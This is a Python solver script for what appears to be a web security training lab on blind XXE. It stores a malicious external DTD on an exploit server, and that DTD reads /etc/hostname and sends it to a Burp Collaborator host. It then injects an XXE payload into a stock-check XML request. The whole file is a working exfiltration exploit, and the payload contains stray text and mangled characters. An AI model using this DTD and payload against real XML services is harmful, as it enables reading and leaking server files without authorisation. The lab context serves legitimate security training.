################################################################################
#
# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
#
# Hack Steps:
#      1. Store the malicious DTD file in your exploit server
#      2. Inject payload into the XML-based check stock request to exfiltrate
#         the hostname using an external DTD
#      3. Check your burp collaborator for the hostname in the HTTP request
#         query parameter
#      4. Submit the solution
#
################################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a910072035441c3809830a10032002a.web-security-academy.net" 

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a0e00d703b141ee80d42f17014800a8.exploit-server.net" 

# Change this to your collaborator domain
BURP_COLLABORATOR = "020hy3fcc640duqxsjx0an7rtiz9nzbo.oastify.com" 

def main():
    print("â¦—#â¦˜ Injection point: " + Fore.YELLOW + "Check stock request")
    print(Fore.WHITE + "â¦—1â¦˜ Storing the malicious DTD file on your exploit server.. ", end="", flush=True)

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8"
    malicious_file_name = "exploit.dtd"
    malicious_file = f"""<!ENTITY % file SYSTEM "file:///etc/hostname">
                            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://{BURP_COLLABORATOR}/?hostname=%file;'>">
                            %eval;
                            %exfiltrate;"""                                                                                                                             
    data = { "responseFile": f"/{malicious_file_name}", "responseBody": malicious_file, "responseHead": response_head, "formAction": "STORE", "urlIsHttps": "on" }
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Using the external DTD to exfiltrate the hostname.. ", end="", flush=True)

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{EXPLOIT_SERVER_URL}/{malicious_file_name}"> %xxe; ]>
                <stockCheck>
                    <productId>
                        2
                    </productId>
                    <storeId>
                        1
                    </storeId>external entities
                    external entities
                </stockCheck>"""
    headers = { "Content-Type": "application/xml" }
    post_data(f"{LAB_URL}/product/stock", payload, headers)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ Check your burp collaborator for the hostname in the HTTP request query parameter then sumbit the solution")


def post_data(url, data, headers = None):
    try:    
        return requests.post(url, data, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()